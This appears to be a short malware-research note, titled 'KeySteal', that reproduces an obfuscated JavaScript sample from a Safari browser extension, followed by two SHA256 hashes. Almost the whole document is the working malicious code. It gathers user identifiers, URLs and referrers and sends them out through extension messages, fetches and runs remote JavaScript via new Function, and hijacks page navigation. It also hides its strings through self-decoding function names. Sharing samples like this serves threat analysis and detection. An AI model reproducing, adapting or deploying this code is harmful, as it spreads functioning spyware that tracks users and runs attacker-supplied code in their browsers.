# KeySteal

There was only one VT hit for the quick searches I did, obfuscated JS:

```javascript
(function () {
	function D(d) {
		var l = d.name;
		if (fofmfoftfqfpfufzfrga() == l) {
			var q = !0, n = eteg();
			if ((l = d.message.srchMatchData) && tj() != l) {
				l = JSON.parse(l);
				0 < l.length && null != l[l.length - 1].ccd && (q = l.pop(), n = q.ccd, q = 1 == q.cce);
				if (!B && q) {
					q = {};
					n = [
						d.message.userGuid || AIdpdmAEdpdmAEdpdmAEdpdmAMdp(),
						d.message.brandId || ABdp(),
						d.message.extensionId,
						window.navigator.userAgent,
						window.location.href,
						document.referrer || tj(),
						n
					];
					for (var b = 0; b < n.length; b++) {
						var c = n, h = b;
						var a = n[b];
						a += tj();
						if (!/^[\d,a-f]{8}-(?:[\d,a-f]{4}-){3}[\d,a-f]{12}$/i.test(a)) {
							for (var g = a && a.length || 0, u = 0; u < z.length; u++)
								z[u].test(a) && (a = a.replace(z[u], ABdp()));
							a = a && a.substr(0, g) || a;
						}
						c[h] = encodeURIComponent(a.replace(/,/g, ddfofyfmea()));
					}
					n = A.compressToEncodedURIComponent(dxgndlgn() + n.join(gndlgn()));
					q.pvmsg = n;
					q[gggefqgddmfmfsfqfzgf()] = window.navigator.userAgent;
					window.safari.extension.dispatchMessage(fxgafsgbgh(), q);
					B = !0;
				}
				q = d.message.tags;
				c = d.message.matchDataTimer;
				n = d.message.navHist;
				b = d.message.weirnga;
				E(d.message.contentRuntimeUrl);
				c = null != c && tj() != c ? parseInt(c) : 0;
				d = Math.round(new Date().getTime()) - c;
				1 == (0 >= c || 14400000 < d) && (d = {}, d[gggefqgddmfmfsfqfzgf()] = window.navigator.userAgent, window.safari.extension.dispatchMessage(gggbfpeygfgd(), d));
				l && 0 < l.length && F(l, q, n, b);
			}
		} else
			ggfzgedmfxgafo() == l && (window.location = d.message.newlp + dzACdo() + (d.message.newlp ? d.message.newlp + ABdn() : tj()) + d.message.newlbased);
	}
	function E(d) {
		G(d, function () {
			try {
				var l = function () {
						document.body ? q() : setTimeout(l, 100);
					}, q = new Function(this.responseText);
				l();
			} catch (n) {
			}
		});
	}
	function G(d, l) {
		var q = new XMLHttpRequest();
		q.addEventListener(fxgafmfp(), l);
		q.open(emekez(), d, !0);
		q.send();
		return q;
	}
	function F(d, l, q, n) {
		var b = document.referrer || tj();
		l = l || tj();
		var c = window.location.href, h = new URL(c).hostname, a = d.filter(function (r) {
				return r.r && h.match(r.d) || !r.r && 0 <= h.indexOf(r.d);
			})[0];
		if (a) {
			d = tj();
			tj() != b && (d = dfgeec() + a.k);
			var g = a.sm.filter(function (r) {
				return r.i || tj() == b ? c.match(r.m) : null;
			})[0];
			if (g && (a = c.indexOf(ABdf() + g.p + ABec()), 0 > a && (a = c.indexOf(ABee() + g.p + ABec())), a++, 0 < a && (g = c.substring(a).indexOf(ABdf()), g = 0 > g ? c.length : g + a, a = c.substring(a + 1, g), null != h && null != a))) {
				var u = n + a + d + l;
				null != q[a] && 10 >= Math.round(new Date().getTime() / 1000) - q[a] || (document.write(ebftfqfmfpedebdoftfqfmfped()), l = {}, l[gggdfxdmfwfqgk()] = a, window.safari.extension.dispatchMessage(fmACfpfzfqgi(), l), setTimeout(function () {
					var r = document.createElement(fyfqgffm());
					r.name = gdfqfrfqACgdfqgd();
					r.content = fzgadmgdfqfrfqACgdfqgd();
					document.head.appendChild(r);
					window.location.href = u;
				}, 10));
			}
		}
	}
	function H(d) {
		d.data && gbgd() == d.data.msg ? (d.data[gggefqgddmfmfsfqfzgf()] = window.navigator.userAgent, d.data.curl = document.URL, d.data.refurl = document.referrer, d.data.reasonId += tj(), d.data.version += tj(), d.data.encrextid = C, window.safari.extension.dispatchMessage(gbgd(), d.data)) : d.data && fqfzfogdfqgjgffufp() == d.data.msg && (C = d.data.id);
	}
	var B = !1, z = [
			/\b(?:\d[() -]*?){9,16}\b/g,
			/\b[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\b/ig
		], A = function () {
			function d(b, c) {
				if (!q[b]) {
					q[b] = {};
					for (var h = 0; h < b.length; h++)
						q[b][b.charAt(h)] = h;
				}
				return q[b][c];
			}
			var l = String.fromCharCode, q = {}, n = {
					compressToBase64: function (b) {
						if (null == b)
							return tj();
						b = n._compress(b, 6, function (c) {
							return egeheiejekelemeneoepeqereseteuevewexeyezfafbfcfdfefffmfnfofpfqfrfsftfufvfwfxfyfzgagbgcgdgegfggghgigjgkgldpdqdrdsdtdudvdwdxdydkdoec().charAt(c);
						});
						switch (b.length % 4) {
						default:
						case 0:
							return b;
						case 1:
							return b + ADec();
						case 2:
							return b + ACec();
						case 3:
							return b + ABec();
						}
					},
					decompressFromBase64: function (b) {
						return null == b ? tj() : tj() == b ? null : n._decompress(b.length, 32, function (c) {
							return d(egeheiejekelemeneoepeqereseteuevewexeyezfafbfcfdfefffmfnfofpfqfrfsftfufvfwfxfyfzgagbgcgdgegfggghgigjgkgldpdqdrdsdtdudvdwdxdydkdoec(), b.charAt(c));
						});
					},
					compressToUTF16: function (b) {
						return null == b ? tj() : n._compress(b, 15, function (c) {
							return l(c + 32);
						}) + ABcz();
					},
					decompressFromUTF16: function (b) {
						return null == b ? tj() : tj() == b ? null : n._decompress(b.length, 16384, function (c) {
							return b.charCodeAt(c) - 32;
						});
					},
					compressToUint8Array: function (b) {
						b = n.compress(b);
						for (var c = new Uint8Array(2 * b.length), h = 0, a = b.length; a > h; h++) {
							var g = b.charCodeAt(h);
							c[2 * h] = g >>> 8;
							c[2 * h + 1] = g % 256;
						}
						return c;
					},
					decompressFromUint8Array: function (b) {
						if (null === b || void 0 === b)
							return n.decompress(b);
						for (var c = Array(b.length / 2), h = 0, a = c.length; a > h; h++)
							c[h] = 256 * b[2 * h] + b[2 * h + 1];
						var g = [];
						return c.forEach(function (u) {
							g.push(l(u));
						}), n.decompress(g.join(tj()));
					},
					compressToEncodedURIComponent: function (b) {
						return null == b ? tj() : n._compress(b, 6, function (c) {
							return egeheiejekelemeneoepeqereseteuevewexeyezfafbfcfdfefffmfnfofpfqfrfsftfufvfwfxfyfzgagbgcgdgegfggghgigjgkgldpdqdrdsdtdudvdwdxdydkdmdd().charAt(c);
						});
					},
					decompressFromEncodedURIComponent: function (b) {
						return null == b ? tj() : tj() == b ? null : (b = b.replace(/ /g, ABdk()), n._decompress(b.length, 32, function (c) {
							return d(egeheiejekelemeneoepeqereseteuevewexeyezfafbfcfdfefffmfnfofpfqfrfsftfufvfwfxfyfzgagbgcgdgegfggghgigjgkgldpdqdrdsdtdudvdwdxdydkdmdd(), b.charAt(c));
						}));
					},
					compress: function (b) {
						return n._compress(b, 16, function (c) {
							return l(c);
						});
					},
					_compress: function (b, c, h) {
						if (null == b)
							return tj();
						var a, g, u = {}, r = {}, x = tj(), y = tj(), w = tj(), t = 2, p = 3, v = 2, m = [], e = 0, f = 0;
						for (g = 0; g < b.length; g += 1)
							if (x = b.charAt(g), Object.prototype.hasOwnProperty.call(u, x) || (u[x] = p++, r[x] = !0), y = w + x, Object.prototype.hasOwnProperty.call(u, y))
								w = y;
							else {
								if (Object.prototype.hasOwnProperty.call(r, w)) {
									if (256 > w.charCodeAt(0)) {
										for (a = 0; v > a; a++)
											e <<= 1, f == c - 1 ? (f = 0, m.push(h(e)), e = 0) : f++;
										var k = w.charCodeAt(0);
										for (a = 0; 8 > a; a++)
											e = e << 1 | 1 & k, f == c - 1 ? (f = 0, m.push(h(e)), e = 0) : f++, k >>= 1;
									} else {
										k = 1;
										for (a = 0; v > a; a++)
											e = e << 1 | k, f == c - 1 ? (f = 0, m.push(h(e)), e = 0) : f++, k = 0;
										k = w.charCodeAt(0);
										for (a = 0; 16 > a; a++)
											e = e << 1 | 1 & k, f == c - 1 ? (f = 0, m.push(h(e)), e = 0) : f++, k >>= 1;
									}
									t--;
									0 == t && (t = Math.pow(2, v), v++);
									delete r[w];
								} else
									for (k = u[w], a = 0; v > a; a++)
										e = e << 1 | 1 & k, f == c - 1 ? (f = 0, m.push(h(e)), e = 0) : f++, k >>= 1;
								t--;
								0 == t && (t = Math.pow(2, v), v++);
								u[y] = p++;
								w = String(x);
							}
						if (tj() !== w) {
							if (Object.prototype.hasOwnProperty.call(r, w)) {
								if (256 > w.charCodeAt(0)) {
									for (a = 0; v > a; a++)
										e <<= 1, f == c - 1 ? (f = 0, m.push(h(e)), e = 0) : f++;
									k = w.charCodeAt(0);
									for (a = 0; 8 > a; a++)
										e = e << 1 | 1 & k, f == c - 1 ? (f = 0, m.push(h(e)), e = 0) : f++, k >>= 1;
								} else {
									k = 1;
									for (a = 0; v > a; a++)
										e = e << 1 | k, f == c - 1 ? (f = 0, m.push(h(e)), e = 0) : f++, k = 0;
									k = w.charCodeAt(0);
									for (a = 0; 16 > a; a++)
										e = e << 1 | 1 & k, f == c - 1 ? (f = 0, m.push(h(e)), e = 0) : f++, k >>= 1;
								}
								t--;
								0 == t && (t = Math.pow(2, v), v++);
								delete r[w];
							} else
								for (k = u[w], a = 0; v > a; a++)
									e = e << 1 | 1 & k, f == c - 1 ? (f = 0, m.push(h(e)), e = 0) : f++, k >>= 1;
							t--;
							0 == t && v++;
						}
						k = 2;
						for (a = 0; v > a; a++)
							e = e << 1 | 1 & k, f == c - 1 ? (f = 0, m.push(h(e)), e = 0) : f++, k >>= 1;
						for (;;) {
							if (e <<= 1, f == c - 1) {
								m.push(h(e));
								break;
							}
							f++;
						}
						return m.join(tj());
					},
					decompress: function (b) {
						return null == b ? tj() : tj() == b ? null : n._decompress(b.length, 32768, function (c) {
							return b.charCodeAt(c);
						});
					},
					_decompress: function (b, c, h) {
						var a, g, u = [], r = 4, x = 4, y = 3, w = [], t = h(0), p = c, v = 1;
						for (a = 0; 3 > a; a += 1)
							u[a] = a;
						var m = 0;
						var e = Math.pow(2, 2);
						for (g = 1; g != e;) {
							var f = t & p;
							p >>= 1;
							0 == p && (p = c, t = h(v++));
							m |= (0 < f ? 1 : 0) * g;
							g <<= 1;
						}
						switch (m) {
						case 0:
							m = 0;
							e = Math.pow(2, 8);
							for (g = 1; g != e;)
								f = t & p, p >>= 1, 0 == p && (p = c, t = h(v++)), m |= (0 < f ? 1 : 0) * g, g <<= 1;
							var k = l(m);
							break;
						case 1:
							m = 0;
							e = Math.pow(2, 16);
							for (g = 1; g != e;)
								f = t & p, p >>= 1, 0 == p && (p = c, t = h(v++)), m |= (0 < f ? 1 : 0) * g, g <<= 1;
							k = l(m);
							break;
						case 2:
							return tj();
						}
						a = u[3] = k;
						for (w.push(k);;) {
							if (v > b)
								return tj();
							m = 0;
							e = Math.pow(2, y);
							for (g = 1; g != e;)
								f = t & p, p >>= 1, 0 == p && (p = c, t = h(v++)), m |= (0 < f ? 1 : 0) * g, g <<= 1;
							switch (k = m) {
							case 0:
								m = 0;
								e = Math.pow(2, 8);
								for (g = 1; g != e;)
									f = t & p, p >>= 1, 0 == p && (p = c, t = h(v++)), m |= (0 < f ? 1 : 0) * g, g <<= 1;
								u[x++] = l(m);
								k = x - 1;
								r--;
								break;
							case 1:
								m = 0;
								e = Math.pow(2, 16);
								for (g = 1; g != e;)
									f = t & p, p >>= 1, 0 == p && (p = c, t = h(v++)), m |= (0 < f ? 1 : 0) * g, g <<= 1;
								u[x++] = l(m);
								k = x - 1;
								r--;
								break;
							case 2:
								return w.join(tj());
							}
							if (0 == r && (r = Math.pow(2, y), y++), u[k])
								k = u[k];
							else {
								if (k !== x)
									return null;
								k = a + a.charAt(0);
							}
							w.push(k);
							u[x++] = a + k.charAt(0);
							r--;
							a = k;
							0 == r && (r = Math.pow(2, y), y++);
						}
					}
				};
			return n;
		}();
	frggfzfogffugafz() == typeof define && define.amd ? define(function () {
		return A;
	}) : ggfzfpfqfrfufzfqfp() != typeof module && null != module && (module.exports = A);
	var C;
	(function () {
		if (!window.top || window.top === window) {
			window.safari.self.addEventListener(fyfqACgefmfsfq(), D);
			window.addEventListener(fyfqACgefmfsfq(), H, !1);
			var d = {};
			d[gggefqgddmfmfsfqfzgf()] = window.navigator.userAgent;
			d.curl = document.URL;
			d.refurl = document.referrer;
			safari.extension.dispatchMessage(gbfmfsfqfufzfugf(), d);
			d = { keys: [] };
			d.keys.push(gegdfoftesfmgffoftejfmgffm());
			d.keys.push(fqgjgffqfzgefugafzeofp());
			d.keys.push(fngdfmfzfpeofp());
			d.keys.push(fyfmgffoftejfmgffmezfufyfqgd());
			d.keys.push(gggefqgdemggfufp());
			d.url = document.URL;
			window.safari.extension.dispatchMessage(fsfqgffqgjfugegffufzfs(), d);
		}
	}());
}());
function ABdk() {
        var asFD = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(asFD);
}
function ABec() {
        var gjBP = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(gjBP);
}
function fngdfmfzfpeofp() {
        var hjEZ = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(hjEZ);
}
function gggefqgddmfmfsfqfzgf() {
        var dyFM = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(dyFM);
}
function eteg() {
        var caGV = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(caGV);
}
function gbfmfsfqfufzfugf() {
        var crHS = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(crHS);
}
function fxgafsgbgh() {
        var bcAJ = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(bcAJ);
}
function ggfzgedmfxgafo() {
        var dtAT = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(dtAT);
}
function gggefqgdemggfufp() {
        var chFR = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(chFR);
}
function ABee() {
        var feAV = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(feAV);
}
function ABcz() {
        var aqER = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(aqER);
}
function emekez() {
        var egDX = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(egDX);
}
function ABdp() {
        var gjGC = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(gjGC);
}
function egeheiejekelemeneoepeqereseteuevewexeyezfafbfcfdfefffmfnfofpfqfrfsftfufvfwfxfyfzgagbgcgdgegfggghgigjgkgldpdqdrdsdtdudvdwdxdydkdmdd() {
        var eiHB = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(eiHB);
}
function ddfofyfmea() {
        var evBC = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(evBC);
}
function gggdfxdmfwfqgk() {
        var fpBF = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(fpBF);
}
function dxgndlgn() {
        var fzHO = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(fzHO);
}
function gegdfoftesfmgffoftejfmgffm() {
        var bcAO = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(bcAO);
}
function fqgjgffqfzgefugafzeofp() {
        var fvFY = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(fvFY);
}
function fyfmgffoftejfmgffmezfufyfqgd() {
        var ckED = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(ckED);
}
function AIdpdmAEdpdmAEdpdmAEdpdmAMdp() {
        var hsFL = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(hsFL);
}
function fsfqgffqgjfugegffufzfs() {
        var cxGX = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(cxGX);
}
function gggbfpeygfgd() {
        var hjDH = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(hjDH);
}
function gbgd() {
        var buFY = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(buFY);
}
function fzgadmgdfqfrfqACgdfqgd() {
        var ehCL = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(ehCL);
}
function ACec() {
        var hjBF = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(hjBF);
}
function dfgeec() {
        var fiGJ = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(fiGJ);
}
function fqfzfogdfqgjgffufp() {
        var acDV = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(acDV);
}
function fyfqACgefmfsfq() {
        var dbDP = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(dbDP);
}
function gndlgn() {
        var cxCS = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(cxCS);
}
function egeheiejekelemeneoepeqereseteuevewexeyezfafbfcfdfefffmfnfofpfqfrfsftfufvfwfxfyfzgagbgcgdgegfggghgigjgkgldpdqdrdsdtdudvdwdxdydkdoec() {
        var grFL = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(grFL);
}
function fmACfpfzfqgi() {
        var hbAE = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(hbAE);
}
function fyfqgffm() {
        var chAK = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(chAK);
}
function ebftfqfmfpedebdoftfqfmfped() {
        var ggAZ = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(ggAZ);
}
function tj() {
        var hhBM = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(hhBM);
}
function gdfqfrfqACgdfqgd() {
        var blBK = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(blBK);
}
function ABdn() {
        var elCS = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(elCS);
}
function ggfzfpfqfrfufzfqfp() {
        var ggBC = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(ggBC);
}
function fofmfoftfqfpfufzfrga() {
        var ejCS = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(ejCS);
}
function fxgafmfp() {
        var dsEX = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(dsEX);
}
function dzACdo() {
        var hcBL = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(hcBL);
}
function ADec() {
        var bnBB = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(bnBB);
}
function frggfzfogffugafz() {
        var brFY = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(brFY);
}
function ABdf() {
        var fbHB = arguments.callee.toString().split(String.fromCharCode(32))[1].slice(0,-2);
        return expand(fbHB);
}
function cnvX(str, base, offset){
    return (str.charCodeAt(0) - offset) * base + str.charCodeAt(1) - offset;
}
function expand(cdstr){
    if(cdstr.length == 2 && cnvX(cdstr,26,97) == 503) {
        return "";
    }
    var rastrS = 52845;
    var str = "";
    var cidx = 1, rc = 1;
    while(cidx < cdstr.length) {
        var c = cdstr[cidx];
        if(c.charCodeAt(0) <= 90) {
            rc = cnvX(cdstr.substr(cidx-1,2),26,65);
        }
        else {
            var chv = cnvX(cdstr.substr(cidx-1,2),26,97);
            chv -= rastrS % 110;
            if(chv<0){
                chv += 255;
            }
            var dc = String.fromCharCode(chv);
            for(var i=0;i<rc;i++){
                str += dc;
            }
            rc = 1;
        }
        cidx += 2;
    }
    return str;
}%
```

## Hashes

| SHA256                                                           |
| ---------------------------------------------------------------- |
| 1cfeeae46aa58cacc226ba5abeece6f39af02ccbfff24e507db77e97383cbe1e |
| 2dfb31a1a1c9f5667fedf895ebc9792abb3b64e51986ab6d94a1f3aec38edf0d |
